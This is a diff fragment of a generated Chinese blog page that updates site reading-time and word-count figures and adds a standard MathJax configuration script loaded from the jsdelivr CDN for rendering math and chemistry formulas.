     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -638,7 +664,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -778,6 +804,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
